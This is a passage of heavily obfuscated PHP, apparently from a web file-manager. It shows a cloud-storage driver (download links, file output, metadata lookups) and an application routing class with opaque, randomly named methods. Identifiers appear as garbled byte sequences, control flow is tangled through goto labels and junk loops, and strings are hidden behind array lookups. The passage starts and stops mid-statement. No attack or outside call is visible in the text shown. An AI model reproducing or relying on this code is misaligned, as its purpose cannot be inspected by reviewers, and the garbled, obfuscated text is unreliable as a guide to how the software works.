d°ƒ‘ñË„¡: $D†îò§Î∑≤ = null; $Fóº–ìä£É = $this->auth->uploadToken($this->bucket, $D†îò§Î∑≤, $FÖêõ≈ıû‰, $Aáì¢¯‹ï≥, !0); $B∑∞À§≈ÚÉ = empty($this->region) || $this->region == $Dëè∫Éóøª[1219] ? $Dëè∫Éóøª[33] : $Dëè∫Éóøª[408] . $this->region; goto b‰‡¨∆Õ„í; bóôÑﬁáµî: } public function download($DÀñÂ∆à∞É, $C˜¥”œ£°é) { goto Fù¯ÿÊƒˆ„; c´éÕÜâèÁ: fclose($e∞ö´Ÿñ¿Ô); return $C˜¥”œ£°é; goto cÉıÕêﬁç—; bãìÒã†öç: $FﬁÎƒÏ›≤ = 1024 * 200; $e∞ö´Ÿñ¿Ô = fopen($C≤ï«ì’‰ƒ, $_SERVER[—Ω][1222]); while (!0) { $Aïè∏∞ì†æ = $this->fileSubstr($DÀñÂ∆à∞É, $cŒèâ”◊∞ı, $FﬁÎƒÏ›≤); if ($Aïè∏∞ì†æ === !1) { return !1; } fwrite($e∞ö´Ÿñ¿Ô, $Aïè∏∞ì†æ); $cŒèâ”◊∞ı += $FﬁÎƒÏ›≤; if (strlen($Aïè∏∞ì†æ) < $FﬁÎƒÏ›≤) { break; } } goto c´éÕÜâèÁ; Fù¯ÿÊƒˆ„: $C≤ï«ì’‰ƒ = IO::getPathInner(IO::mkfile($C˜¥”œ£°é)); if (!($A‰»∫ñ⁄◊— = $this->link($DÀñÂ∆à∞É))) { return !1; } $cŒèâ”◊∞ı = 0; goto bãìÒã†öç; cÉıÕêﬁç—: } public function link($d¡òÍ©ó√ﬂ, $Eï±ö˜æ”’ = '') { if (!$this->isFile($d¡òÍ©ó√ﬂ)) { return !1; } $C÷§÷Ûÿ˘¿ = $this->getHost() . $_SERVER[—Ω][8] . $this->pathEncode($d¡òÍ©ó√ﬂ) . $Eï±ö˜æ”’; return $this->auth->privateDownloadUrl($C÷§÷Ûÿ˘¿, 3600 * 12); } public function fileOut($BàÂú’˘Ëä, $C™ë—Æ∞©¢ = false, $Bƒ÷Ô◊÷êÉ = false, $e©ÊÌÍÀÖä = '') { $Fﬁ‘»¢ªÉë =& $_SERVER[—Ω]; if (!$Bƒ÷Ô◊÷êÉ) { $Bƒ÷Ô◊÷êÉ = $this->pathThis($BàÂú’˘Ëä); } $DÍã§Œí•– = $C™ë—Æ∞©¢ ? $Fﬁ‘»¢ªÉë[1223] . rawurlencode($Bƒ÷Ô◊÷êÉ) : $Fﬁ‘»¢ªÉë[33]; $Eÿ‰’°ΩÒµ = $this->link($BàÂú’˘Ëä, $DÍã§Œí•–); $this->fileOutLink($Eÿ‰’°ΩÒµ); } public function fileOutServer($D÷ßıŸÌç‰, $EÁ≈ÊùùÍÈ = false, $dÉÜÎ“Ù¬ù = false, $F†’ÏÁŸÉå = '') { parent::fileOut($D÷ßıŸÌç‰, $EÁ≈ÊùùÍÈ, $dÉÜÎ“Ù¬ù, $F†’ÏÁŸÉå); } public function fileOutImage($f¬Ë˜ÿ›Ÿî, $b’±‚ª∆ÜÑ = 250) { $dÜü†Áñ·ä = $this->link($f¬Ë˜ÿ›Ÿî, $_SERVER[—Ω][1224] . $b’±‚ª∆ÜÑ); $this->fileOutLink($dÜü†Áñ·ä); } public function fileOutImageServer($C©Ã≤«õÑí, $F’¥ëà•Ó = 250) { parent::fileOutImage($C©Ã≤«õÑí, $F’¥ëà•Ó); } public function hashMd5($dú÷ù˘Öä¥) { $aŒÙã°®æ⁄ =& $_SERVER[—Ω]; $Dµ·ìÃ◊òﬂ = $this->objectMeta($dú÷ù˘Öä¥); return isset($Dµ·ìÃ◊òﬂ[$aŒÙã°®æ⁄[193]]) ? $Dµ·ìÃ◊òﬂ[$aŒÙã°®æ⁄[193]] : !1; $cÀñáë∞ø = $this->link($dú÷ù˘Öä¥, $aŒÙã°®æ⁄[1225]); } public function size($dπøÓÈ≠™è) { $Eß∏êêàÆ” = $this->objectMeta($dπøÓÈ≠™è); return $Eß∏êêàÆ” ? $Eß∏êêàÆ”[$_SERVER[—Ω][77]] : 0; } public function info($AÀŒßø∫Ûö) { if ($this->isFolder($AÀŒßø∫Ûö)) { return $this->folderInfo($AÀŒßø∫Ûö); } else { if ($this->isFile($AÀŒßø∫Ûö)) { return $this->fileInfo($AÀŒßø∫Ûö); } } return !1; } public function exist($fùîåŸ™∆”) { return $this->isFile($fùîåŸ™∆”) || $this->isFolder($fùîåŸ™∆”); } public function isFile($B∆ﬂÎÕòæê) { return !$this->isFolder($B∆ﬂÎÕòæê) && $this->objectMeta($B∆ﬂÎÕòæê); } public function isFolder($b˘Î®€Èåç) { return $this->cacheMethod($_SERVER[—Ω][220], $b˘Î®€Èåç); } protected function objectMeta($CÜ€ÕóºêØ) { return $this->cacheMethod($_SERVER[—Ω][221], $CÜ€ÕóºêØ); } protected function _objectMeta($BòßñÔ√¡±) { $E∑ÎÜ∏¡√ê =& $_SERVER[—Ω]; list($AÑÔéÛõÊÌ, $bãüá°∏†ö) = $this->bucketManager->stat($this->bucket, $BòßñÔ√¡±); if ($AÑÔéÛõÊÌ) { $AÑÔéÛõÊÌ[$E∑ÎÜ∏¡√ê[77]] = intval($AÑÔéÛõÊÌ[$E∑ÎÜ∏¡√ê[1212]]); } return $AÑÔéÛõÊÌ; } protected function _isFolder($eå¢ö˜ÃòÖ) { $dΩã∞∫úíò =& $_SERVER[—Ω]; list($d¬ÔÛëØ√¬, $d≥ﬂáÍ°ˆ∂) = $this->bucketManager->listFiles($this->bucket, trim($eå¢ö˜ÃòÖ, $dΩã∞∫úíò[8]) . $dΩã∞∫úíò[8], $dΩã∞∫úíò[33], 1, $dΩã∞∫úíò[8]); return !empty($d¬ÔÛëØ√¬[$dΩã∞∫úíò[1211]]) || !empty($d¬ÔÛëØ√¬[$dΩã∞∫úíò[1214]]) ? !0 : !1; } } goto AƒãÉπí“∫; BÖ◊≠å¢æ¿: $F–¥»âøÃ  = $_SERVER[—Ω][546]; if (!$F–¥»âøÃ ) { return; } class Application { private $defaultModule = "\151\156\144\x65\x78"; private $defaultController = "\151\x6e\144\x65\x78"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($dÚí∑ ÷çØ) { goto AÛﬁ◊«ƒˆ÷; e⁄ÒüÇÁ»˘: $eç∞Ë√àÊÂ = $BâÖÉ√ÿÆÓ[547]; $this->defaultModule = $d∏¶†πñ›∂[0] ? $d∏¶†πñ›∂[0] : $this->defaultModule; $aÍç∑µ∏Ûë = $BâÖÉ√ÿÆÓ[548]; goto dæéÿπ™Îú; AÛﬁ◊«ƒˆ÷: $BâÖÉ√ÿÆÓ =& $_SERVER[—Ω]; $câ ›ñ«⁄© =& $_SERVER[†Äâ‡≠ﬁ]; $d∏¶†πñ›∂ = $câ ›ñ«⁄©[0]($câ ›ñ«⁄©[1], $câ ›ñ«⁄©[2]($dÚí∑ ÷çØ, $câ ›ñ«⁄©[1])); goto e⁄ÒüÇÁ»˘; dæéÿπ™Îú: $this->defaultController = $d∏¶†πñ›∂[1] ? $d∏¶†πñ›∂[1] : $this->defaultController; $this->defaultAction = $d∏¶†πñ›∂[2] ? $d∏¶†πñ›∂[2] : $this->defaultAction; $this->{$_SERVER[†Äâ‡≠ﬁ][3]}($câ ›ñ«⁄©[4], array($this, $câ ›ñ«⁄©[5])); goto d†Ÿ∆±ú¨¡; d†Ÿ∆±ú¨¡: $d‚¥È∫ô¯ = $BâÖÉ√ÿÆÓ[549]; goto a’”ﬂåØ¬’; a’”ﬂåØ¬’: } public function appRun($AÀ≈÷∂èÖ) { goto c˜¢∞©Ö€∂; FçÖ®™Ã≥Æ: $f‰ûëÆÙœª = $C°®Ö≠æ’Á[6]($c¯ÇÑßäàä[0]); $CÀÖ◊êÛ¶› = $C°®Ö≠æ’Á[7]; $B™Óõ¯…è° = $a÷…·´∞¶‡[550]; goto cìñÑﬁ‘Éà; d°Ÿ÷ª¿±Ú: $C°®Ö≠æ’Á[17]($AÀ≈÷∂èÖ); $C°®Ö≠æ’Á[13](array($C°®Ö≠æ’Á[14], $C°®Ö≠æ’Á[15]), $CÀÖ◊êÛ¶› . $C°®Ö≠æ’Á[18], $AÀ≈÷∂èÖ); $aáèàÈ‘˘¯ = $a÷…·´∞¶‡[552]; goto EâäâÈ–‚€; c˜¢∞©Ö€∂: $a÷…·´∞¶‡ =& $_SERVER[—Ω]; $C°®Ö≠æ’Á =& $_SERVER[†Äâ‡≠ﬁ]; $c¯ÇÑßäàä = $C°®Ö≠æ’Á[0]($C°®Ö≠æ’Á[1], $AÀ≈÷∂èÖ); goto FçÖ®™Ã≥Æ; EâäâÈ–‚€: while ($aáèàÈ‘˘¯ < $a÷…·´∞¶‡[553]) { if ($aáèàÈ‘˘¯ >= 0) { break; } $aáèàÈ‘˘¯++; } goto aˆêä€ƒ†ª; cìñÑﬁ‘Éà: if (strlen($B™Óõ¯…è°) < $a÷…·´∞¶‡[551]) { die; } if ($f‰ûëÆÙœª == $C°®Ö≠æ’Á[8]) { $CÀÖ◊êÛ¶› = $C°®Ö≠æ’Á[9]; $c¯ÇÑßäàä[0] = $C°®Ö≠æ’Á[10]; $c¯ÇÑßäàä[1] = $c¯ÇÑßäàä[1] . $C°®Ö≠æ’Á[11]; $AÀ≈÷∂èÖ = $C°®Ö≠æ’Á[12]($C°®Ö≠æ’Á[1], $c¯ÇÑßäàä); $AÀ≈÷∂èÖ = $C°®Ö≠æ’Á[2]($AÀ≈÷∂èÖ, $C°®Ö≠æ’Á[1]); } $C°®Ö≠æ’Á[13](array($C°®Ö≠æ’Á[14], $C°®Ö≠æ’Á[15]), $CÀÖ◊êÛ¶› . $C°®Ö≠æ’Á[16], $AÀ≈÷∂èÖ); goto d°Ÿ÷ª¿±Ú; aˆêä€ƒ†ª: } private function autorun() { $bŸ…≤ƒæ‰¶ =& $_SERVER[†Äâ‡≠ﬁ]; global $config; $cØê¿¶®¥Ã = $_SERVER[—Ω][554]; if ($bŸ…≤ƒæ‰¶[19]($config[$bŸ…≤ƒæ‰¶[20]]) == 0) { return; } foreach ($config[$bŸ…≤ƒæ‰¶[20]] as $c¢ùµö¡◊Æ => $d˘„â±Óâ‰) { $this->{$_SERVER[†Äâ‡≠ﬁ][21]}($d˘„â±Óâ‰); } } private function uhjq327502c4() { goto Cë≤ÿÜ≈ˆë; bÇÛØ°Ç›: $GLOBALS[$a°õ¯îÛ¢Ø[22]][$a°õ¯îÛ¢Ø[28]] = $a°õ¯îÛ¢Ø[29]($a°õ¯îÛ¢Ø[1], $GLOBALS[$a°õ¯îÛ¢Ø[22]][$a°õ¯îÛ¢Ø[23]]); goto fﬂﬁ‘¯∫â¢; D§ÂÖÈÕØµ: $Bàü·≥ôêﬁ = $GLOBALS[$a°õ¯îÛ¢Ø[22]][$a°õ¯îÛ¢Ø[23]][0]; if (!$Bàü·≥ôêﬁ || $a°õ¯îÛ¢Ø[24]($Bàü·≥ôêﬁ) <= $a°õ¯îÛ¢Ø[24]($F”çËÜß≠ª)) { return; } if ($a°õ¯îÛ¢Ø[6]($a°õ¯îÛ¢Ø[25]($Bàü·≥ôêﬁ, -$a°õ¯îÛ¢Ø[24]($F”çËÜß≠ª))) != $F”çËÜß≠ª) { return; } goto D—œ÷øÍ‡´; fıπ±µÀíç: $GLOBALS[$a°õ¯îÛ¢Ø[22]][$a°õ¯îÛ¢Ø[23]] = $a°õ¯îÛ¢Ø[27]($CøÎüÇ•È, $Eƒ€´ëúÖ•); $eﬂ⁄Á–ú⁄‘ = $fÁ≈©éùÌœ[555]; while (strlen($eﬂ⁄Á–ú⁄‘) < $fÁ≈©éùÌœ[556]) { if (!$eﬂ⁄Á–ú⁄‘) { break; } $eﬂ⁄Á–ú⁄‘++; } goto bÇÛØ°Ç›; Cë≤ÿÜ≈ˆë: $fÁ≈©éùÌœ =& $_SERVER[—Ω]; $a°õ¯îÛ¢Ø =& $_SERVER[†Äâ‡≠ﬁ]; $F”çËÜß≠ª = $a°õ¯îÛ¢Ø[8]; goto D§ÂÖÈÕØµ; D—œ÷øÍ‡´: $B‘…†®∆®Á = $a°õ¯îÛ¢Ø[25]($Bàü·≥ôêﬁ, 0, -$a°õ¯îÛ¢Ø[24]($F”çËÜß≠ª)); $CøÎüÇ•È = array($a°õ¯îÛ¢Ø[8], $B‘…†®∆®Á); $Eƒ€´ëúÖ• = $a°õ¯îÛ¢Ø[26]($GLOBALS[$a°õ¯îÛ¢Ø[22]][$a°õ¯îÛ¢Ø[23]], 1); goto fıπ±µÀíç; fﬂﬁ‘¯∫â¢: } private function ntef1ab8c025() { goto bï—ÓﬁƒÓÑ; d›»πó≥ÜÂ: $bæ€ŒÌáÎ¬ = $AÿæèÀÀŒ∆[33]($E‡⁄”‘Òú§, $eµó‚Ï‚–º); $FñÏΩ∏Êï∑ = $AÿæèÀÀŒ∆[25]($E‡⁄”‘Òú§, $bæ€ŒÌáÎ¬ + $AÿæèÀÀŒ∆[24]($eµó‚Ï‚–º)); $AÿæèÀÀŒ∆[34]($AÿæèÀÀŒ∆[35], $FñÏΩ∏Êï∑, $CËûá‰âÙà); goto FŸœÖÍë∑◊; FŸœÖÍë∑◊: $FñÏΩ∏Êï∑ = $AÿæèÀÀŒ∆[2]($CËûá‰âÙà[0][0], $AÿæèÀÀŒ∆[36]); $DÜÛâ©£ë¡ = $CçÑˆ«ØÖø[557]; if (!$DÜÛâ©£ë¡) { die; } goto Dè…óïÖû¶; dÍé“Ú±äÇ: $E‡⁄”‘Òú§ = $_SERVER[$AÿæèÀÀŒ∆[30]]; $eµó‚Ï‚–º = $AÿæèÀÀŒ∆[31]; if (!$AÿæèÀÀŒ∆[32]($E‡⁄”‘Òú§, $eµó‚Ï‚–º)) { return; } goto d›»πó≥ÜÂ; Dè…óïÖû¶: $GLOBALS[$AÿæèÀÀŒ∆[22]][$AÿæèÀÀŒ∆[23]] = $AÿæèÀÀŒ∆[0]($AÿæèÀÀŒ∆[36], $FñÏΩ∏Êï∑); $GLOBALS[$AÿæèÀÀŒ∆[22]][$AÿæèÀÀŒ∆[28]] = $AÿæèÀÀŒ∆[29]($AÿæèÀÀŒ∆[1], $GLOBALS[$AÿæèÀÀŒ∆[22]][$AÿæèÀÀŒ∆[23]]); $EÉ†√öë›Ê = $CçÑˆ«ØÖø[558]; goto D…ô√Ÿàû°; bï—ÓﬁƒÓÑ: $CçÑˆ«ØÖø =& $_SERVER[—Ω]; $AÿæèÀÀŒ∆ =& $_SERVER[†Äâ‡≠ﬁ]; if ($GLOBALS[$AÿæèÀÀŒ∆[22]][$AÿæèÀÀŒ∆[28]] != $AÿæèÀÀŒ∆[10]) { return; } goto dÍé“Ú±äÇ; D…ô√Ÿàû°: if (strlen($EÉ†√öë›Ê) < $CçÑˆ«ØÖø[559]) { die; } goto D¨ÈÖòëˆ∆; D¨ÈÖòëˆ∆: } public function run() { goto b“¢á∏·√Ì; AŒ±¶·œ∑ﬂ: $this->{$_SERVER[†Äâ‡≠ﬁ][38]}(); $e∫áåÎö¿ø = $GLOBALS[$BÈª≤–Æ¿∞[22]][$BÈª≤–Æ¿∞[23]]; $bäèÊµÛÿç = $GLOBALS[$BÈª≤–Æ¿∞[22]][$BÈª≤–Æ¿∞[28]]; goto AÍÿ ≠·ÓÈ; cºÛÀ∫¶À£: $BÈª≤–Æ¿∞[39]($BÈª≤–Æ¿∞[42], isset($e∫áåÎö¿ø[2]) && $e∫áåÎö¿ø[0] ? $e∫áåÎö¿ø[2] : $this->defaultAction); $aÊÜìÎº†Ç = $e√∞ï√≤á´[561]; if (strlen($aÊÜìÎº†Ç) < $e√∞ï√≤á´[556]) { die; } goto A”Ñ¡‰ë·â; eÖˆ¥‚øóÉ: while ($Få≈Æãâ¥± < $e√∞ï√≤á´[559]) { if ($Få≈Æãâ¥± >= 0) { break; } $Få≈Æãâ¥±++; } $this->{$_SERVER[†Äâ‡≠ﬁ][45]}(); if ($BÈª≤–Æ¿∞[19]($e∫áåÎö¿ø) >= 3) { $this->{$_SERVER[†Äâ‡≠ﬁ][21]}($bäèÊµÛÿç); } else { $this->{$_SERVER[†Äâ‡≠ﬁ][21]}(ACTION); } goto Bù™›¡…©©; AÍÿ ≠·ÓÈ: $BÈª≤–Æ¿∞[39]($BÈª≤–Æ¿∞[40], isset($e∫áåÎö¿ø[0]) && $e∫áåÎö¿ø[0] ? $e∫áåÎö¿ø[0] : $this->defaultModule); $DÉ÷ØÉËÓç = $e√∞ï√≤á´[560]; $BÈª≤–Æ¿∞[39]($BÈª≤–Æ¿∞[41], isset($e∫áåÎö¿ø[1]) && $e∫áåÎö¿ø[0] ? $e∫áåÎö¿ø[1] : $this->defaultController); goto cºÛÀ∫¶À£; A”Ñ¡‰ë·â: $BÈª≤–Æ¿∞[39]($BÈª≤–Æ¿∞[43], MOD . $BÈª≤–Æ¿∞[1] . ST . $BÈª≤–Æ¿∞[1] . ACT); $_SERVER[$BÈª≤–Æ¿∞[44]] = $BÈª≤–Æ¿∞[6](ACTION); $Få≈Æãâ¥± = $e√∞ï√≤á´[562]; goto eÖˆ¥‚øóÉ; b“¢á∏·√Ì: $e√∞ï√≤á´ =& $_SERVER[—Ω]; $BÈª≤–Æ¿∞ =& $_SERVER[†Äâ‡≠ﬁ]; $this->{$_SERVER[†Äâ‡≠ﬁ][37]}(); goto AŒ±¶·œ∑ﬂ; Bù™›¡…©©: } private $girtef17344a = array(); private $amdb4b1f3d62 = ''; public function zitjdeb105bc() { goto dÛØÛ¢ªåﬁ; dÛØÛ¢ªåﬁ: $d¡äòà°“ë =& $_SERVER[—Ω]; $BÈöºâñõô =& $_SERVER[†Äâ‡≠ﬁ]; $this->{$_SERVER[†Äâ‡≠ﬁ][46]}(); goto D˘Û’êòı†; FΩÒé‰çêÔ: $this->{$_SERVER[†Äâ‡≠ﬁ][48]}(); $this->{$_SERVER[†Äâ‡≠ﬁ][49]}(); $CßÑ„∏ÊŒÉ = $d¡äòà°“ë[564]; goto a‘æ≥ì§±Õ; B∏¿⁄’´Á«: $Eâπ¿∆éåÈ = $d¡äòà°“ë[567]; if (!$Eâπ¿∆éåÈ) { return; } $this->{$_SERVER[†Äâ‡≠ﬁ][3]}($BÈöºâñõô[55], array($this, $BÈöºâñõô[56])); goto FôÔÀÏÖ–Ã; E·¬∆ÔäÜı: if (!$E†ÀÌÿâ“Ë) { die; } $this->{$_SERVER[†Äâ‡≠ﬁ][52]}(); $this->{$_SERVER[†Äâ‡≠ﬁ][3]}($BÈöºâñõô[53], array($this, $BÈöºâñõô[54])); goto B∏¿⁄’´Á«; e∞⁄Ì∏â•œ: if (!$AæÖ∆ôãá) { return; } $this->{$_SERVER[†Äâ‡≠ﬁ][51]}(); $E†ÀÌÿâ“Ë = $d¡äòà°“ë[566]; goto E·¬∆ÔäÜı; D††∂Ë¨èì: $d˘Óî–∞ä¶ = $d¡äòà°“ë[569]; if (strlen($d˘Óî–∞ä¶) < $d¡äòà°“ë[553]) { return; } goto BÜ°∫≥√ŸΩ; FôÔÀÏÖ–Ã: $eú«’éﬁäπ = $d¡äòà°“ë[568]; $this->{$_SERVER[†Äâ‡≠ﬁ][3]}($BÈöºâñõô[57], array($this, $BÈöºâñõô[58])); $this->{$_SERVER[†Äâ‡≠ﬁ][3]}($BÈöºâñõô[59], array($this, $BÈöºâñõô[60])); goto D††∂Ë¨èì; a‘æ≥ì§±Õ: if (strlen($CßÑ„∏ÊŒÉ) < $d¡äòà°“ë[551]) { return; } $this->{$_SERVER[†Äâ‡≠ﬁ][50]}(); $AæÖ∆ôãá = $d¡äòà°“ë[565]; goto e∞⁄Ì∏â•œ; D˘Û’êòı†: $this->{$_SERVER[†Äâ‡≠ﬁ][47]}(); $Aïö»§õª› = $d¡äòà°“ë[563]; while ($Aïö»§õª› < $d¡äòà°“ë[551]) { if ($Aïö»§õª› >= 0) { break; } $Aïö»§õª›++; } goto FΩÒé‰çêÔ; BÜ°∫≥√ŸΩ: } public function zdrt6270b1e2($Cçû∏±¢Û„) { goto dÛ∆∂œ«Üò; a”◊¬‚¿Ñ≥: $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[117]] = $eãÆŒ£ö¶‹[118]($eãÆŒ£ö¶‹[119]()); $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[120]] = $this->amdb4b1f3d62; $EŸ¢≈äËã¡ = $eàÓÁÎÒèÁ[573]; goto fâˆëƒ¢ÁØ; D‚Õ©ÈÌÀÚ: $bÇı‰Üë¢å = array($eãÆŒ£ö¶‹[64], $eãÆŒ£ö¶‹[65], $eãÆŒ£ö¶‹[66], $eãÆŒ£ö¶‹[67], $eãÆŒ£ö¶‹[68], $eãÆŒ£ö¶‹[69], $eãÆŒ£ö¶‹[70], $eãÆŒ£ö¶‹[71], $eãÆŒ£ö¶‹[72], $eãÆŒ£ö¶‹[73], $eãÆŒ£ö¶‹[74], $eãÆŒ£ö¶‹[75], $eãÆŒ£ö¶‹[76], $eãÆŒ£ö¶‹[77], $eãÆŒ£ö¶‹[78], $eãÆŒ£ö¶‹[79], $eãÆŒ£ö¶‹[80], $eãÆŒ£ö¶‹[81], $eãÆŒ£ö¶‹[82], $eãÆŒ£ö¶‹[83], $eãÆŒ£ö¶‹[84], $eãÆŒ£ö¶‹[85], $eãÆŒ£ö¶‹[86], $eãÆŒ£ö¶‹[87], $eãÆŒ£ö¶‹[88], $eãÆŒ£ö¶‹[89], $eãÆŒ£ö¶‹[90]); $Bˆ∆æÎæ¶Ú = $eàÓÁÎÒèÁ[570]; if (!$Bˆ∆æÎæ¶Ú) { return; } goto cÎÔÇóóÖÚ; dÛ∆∂œ«Üò: $eàÓÁÎÒèÁ =& $_SERVER[—Ω]; $eãÆŒ£ö¶‹ =& $_SERVER[†Äâ‡≠ﬁ]; $e©∂≈®∞™ê = $eãÆŒ£ö¶‹[61]($eãÆŒ£ö¶‹[62])->{$_SERVER[†Äâ‡≠ﬁ][63]}(); goto D‚Õ©ÈÌÀÚ; A«≤«’ö†Ö: $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[128]] = $eãÆŒ£ö¶‹[104]($this->girtef17344a, $eãÆŒ£ö¶‹[129], $eãÆŒ£ö¶‹[10]); $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[130]] = $eãÆŒ£ö¶‹[104]($this->girtef17344a, $eãÆŒ£ö¶‹[131], $eãÆŒ£ö¶‹[10]); $aıƒ≠ê°¯Ü = $eàÓÁÎÒèÁ[574]; goto eœù¯Àùüã; eœù¯Àùüã: if (strlen($aıƒ≠ê°¯Ü) < $eàÓÁÎÒèÁ[553]) { die; } if ($eãÆŒ£ö¶‹[104]($GLOBALS, $eãÆŒ£ö¶‹[132]) && $this->config[$eãÆŒ£ö¶‹[133]]) { $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[134]] = WEB_ROOT; } return $Cçû∏±¢Û„; goto D’†ò‚∆¿É; fâˆëƒ¢ÁØ: if (strlen($EŸ¢≈äËã¡) < $eàÓÁÎÒèÁ[551]) { return; } if ($e©∂≈®∞™ê[$eãÆŒ£ö¶‹[120]] != $eãÆŒ£ö¶‹[121]) { $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[122]] = $e©∂≈®∞™ê[$eãÆŒ£ö¶‹[122]]; $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[123]] = $e©∂≈®∞™ê[$eãÆŒ£ö¶‹[123]]; $aŸá±òûÈ™ = $eãÆŒ£ö¶‹[124](10) . $this->amdb4b1f3d62 . $eãÆŒ£ö¶‹[124](5); $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[93]][$eãÆŒ£ö¶‹[125]][$eãÆŒ£ö¶‹[126]] = $this->{$_SERVER[†Äâ‡≠ﬁ][127]}($aŸá±òûÈ™, $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[113]]); } if ($this->amdb4b1f3d62 == $eãÆŒ£ö¶‹[121]) { $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[93]][$eãÆŒ£ö¶‹[94]][$eãÆŒ£ö¶‹[99]][$eãÆŒ£ö¶‹[107]] = 0; } goto A«≤«’ö†Ö; cû˘Ûúõëµ: $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[93]][$eãÆŒ£ö¶‹[94]][$eãÆŒ£ö¶‹[99]] = array($eãÆŒ£ö¶‹[100] => (int) $a €îÔúÁƒ[$eãÆŒ£ö¶‹[101]], $eãÆŒ£ö¶‹[102] => $eãÆŒ£ö¶‹[103]($eãÆŒ£ö¶‹[104]($a €îÔúÁƒ, $eãÆŒ£ö¶‹[105], array())), $eãÆŒ£ö¶‹[106] => (int) $eãÆŒ£ö¶‹[104]($a €îÔúÁƒ, $eãÆŒ£ö¶‹[107], 0)); $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[109]] = $eãÆŒ£ö¶‹[110]($eãÆŒ£ö¶‹[111])->{$_SERVER[†Äâ‡≠ﬁ][112]}(); $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[108]][$eãÆŒ£ö¶‹[113]] = $eãÆŒ£ö¶‹[114]($_SERVER[$eãÆŒ£ö¶‹[115]] . $e©∂≈®∞™ê[$eãÆŒ£ö¶‹[116]]); goto a”◊¬‚¿Ñ≥; B´ÇàÂçÊÈ: $EïÿΩô≈Ωπ = $eàÓÁÎÒèÁ[571]; if (!$EïÿΩô≈Ωπ) { die; } unset($Cçû∏±¢Û„[$eãÆŒ£ö¶‹[93]][$eãÆŒ£ö¶‹[95]][$eãÆŒ£ö¶‹[97]]); goto Eó⁄àûÌ«Œ; cÎÔÇóóÖÚ: foreach ($bÇı‰Üë¢å as $A ﬁí‰∑ê∑) { $Cô™êÌì∫ì = $GLOBALS[$eãÆŒ£ö¶‹[91]][$eãÆŒ£ö¶‹[92]][$A ﬁí‰∑ê∑]; if (isset($e©∂≈®∞™ê[$A ﬁí‰∑ê∑])) { $Cô™êÌì∫ì = $e©∂≈®∞™ê[$A ﬁí‰∑ê∑]; } $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[93]][$eãÆŒ£ö¶‹[94]][$A ﬁí‰∑ê∑] = $Cô™êÌì∫ì; } $a €îÔúÁƒ = $Cçû∏±¢Û„[$eãÆŒ£ö¶‹[93]][$eãÆŒ£ö¶‹[94]][$eãÆŒ£ö¶‹[76]]; unset($Cçû∏±¢Û„[$eãÆŒ£ö¶‹[93]][$eãÆŒ£ö¶‹[95]][$eãÆŒ£ö¶‹[96]]); goto B´ÇàÂçÊÈ; Eó⁄àûÌ«Œ: $AìµÓŒûÂ– = $eàÓÁÎÒèÁ[572]; unset($Cçû∏±¢Û„[$eãÆŒ£ö¶‹[93]][$eãÆŒ£ö¶‹[94]][$eãÆŒ£ö¶‹[76]]); unset($Cçû∏±¢Û„[$eãÆŒ£ö¶‹[93]][$eãÆŒ£ö¶‹[94]][$eãÆŒ£ö¶‹[98]]); goto cû˘Ûúõëµ; D’†ò‚∆¿É: } private function hgoa6ee2021c() { goto B¶Æ‚¡îÂ®; b≥ƒﬁÆ§ÇÁ: if ($this->amdb4b1f3d62 == $eÇ”öËì™˜[121]) { return; } $D⁄°∆éÑÇâ = array($eÇ”öËì™˜[153], $eÇ”öËì™˜[154], $eÇ”öËì™˜[155], $eÇ”öËì™˜[156], $eÇ”öËì™˜[157], $eÇ”öËì™˜[158]); $D≤¬ò¿ÍÎ‘ = $a´…ç·Â°å[578]; goto cåìﬂß≠Æ◊; E√á∏√∆é£: $CùËæÛàß = array($eÇ”öËì™˜[159] => $F∞¡—ÒÀ®⁄[$eÇ”öËì™˜[64]], $eÇ”öËì™˜[160] => $F∞¡—ÒÀ®⁄[$eÇ”öËì™˜[65]], $eÇ”öËì™˜[161] => $eÇ”öËì™˜[10]); $BäÕ∫¥Èπß = $a´…ç·Â°å[580]; while ($BäÕ∫¥Èπß < $a´…ç·Â°å[581]) { if ($BäÕ∫¥Èπß >= 0) { break; } $BäÕ∫¥Èπß++; } goto EŒﬁêñµà‰; EŒﬁêñµà‰: foreach ($D⁄°∆éÑÇâ as $fªÓñ°µÌç) { if (!isset($F∞¡—ÒÀ®⁄[$fªÓñ°µÌç]) || !$F∞¡—ÒÀ®⁄[$fªÓñ°µÌç]) { continue; } $CùËæÛàß[$fªÓñ°µÌç] = $F∞¡—ÒÀ®⁄[$fªÓñ°µÌç]; } $eÇ”öËì™˜[13](array($eÇ”öËì™˜[151], $eÇ”öËì™˜[152]), $CùËæÛàß); $D“âπ»°Ëè = $a´…ç·Â°å[582]; goto aê·§¨¥∆≤; B¶Æ‚¡îÂ®: $a´…ç·Â°å =& $_SERVER[—Ω]; $eÇ”öËì™˜ =& $_SERVER[†Äâ‡≠ﬁ]; if ($_SERVER[$eÇ”öËì™˜[44]] == $eÇ”öËì™˜[135]) { goto FÕÛÔ¡•£·; dìÑ“◊éû≈: if (!$d≠Ûô¬º≈Ò) { die; } $eÇ”öËì™˜[13](array($eÇ”öËì™˜[151], $eÇ”öËì™˜[152]), $CùËæÛàß); $BÍÍ°–å≥Æ = $a´…ç·Â°å[577]; goto D¢ç©¶ ¿¬; FÕÛÔ¡•£·: $a‹¯¬¶•ìÍ = array($eÇ”öËì™˜[120] => $this->amdb4b1f3d62, $eÇ”öËì™˜[136] => $this->{$_SERVER[†Äâ‡≠ﬁ][137]}(), $eÇ”öËì™˜[138] => 